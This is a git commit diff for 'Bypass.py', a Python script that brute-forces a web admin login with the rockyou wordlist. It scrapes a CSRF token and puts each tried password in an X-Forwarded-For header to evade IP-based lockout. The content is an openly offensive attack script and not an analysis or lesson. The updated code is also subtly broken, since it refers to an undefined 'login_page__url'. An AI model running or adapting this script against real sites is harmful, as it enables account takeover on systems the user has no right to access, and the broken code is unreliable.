32514cdb486cdacbd87cc1b59992b054c890145e
Sheri98 <52729173+Sheri98@users.noreply.github.com>
2020-07-08 10:28:58 +0530

    Update Bypass.py

--- Bypass.py
+++ Bypass.py
@@ -3,12 +3,13 @@
 import requests
 import re
 import codecs
+import time
 
 host = 'ip'
-login_url = host + '/admin'
+login_page_url = host + '/admin'
 #passlist = ["password1","password2","password3","password4"]
 passlist = []
-username = 'username'
+username = 'admin'
 
 with codecs.open('/usr/share/wordlists/rockyou.txt' ,'r+',encoding='utf-8',errors='ignore') as f:
     for line in f:
@@ -18,14 +19,14 @@ passlist = [ item.strip() for item in passlist]
 
 for password in passlist:
     session = requests.Session()
-    login_page = session.get(login_url)
-    
-    print('[*] Trying This password as IP :{p}'.format(p=password))
+    login_page = session.get(login_page_url)
+    token   = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',login_page.text).group(1)
+    print(f"Password as ip :{password}")
 
     headers = {
         'X-Forwarded-For' : str(password),
         'User-Agent' : 'Mozilla\/5.0 (X11; Linux x86_64; rv:68.0) Gecko\/20100101 Firefox\/68.',
-        'Referer': login_url
+        'Referer': login_page__url
         }
     data ={
             'tokenCSRF': token,
@@ -34,7 +35,7 @@ for password in passlist:
             'save' : ''
             }
 
-    login_result = session.post(login_url,headers = headers ,data = data, allow_redirects=False)
+    login_result = session.post(login_page_url,headers = headers ,data = data, allow_redirects=False)
     if 'location' in login_result.headers:
         if '/admin/dashboard' in login_result.headers['location']:
             print()
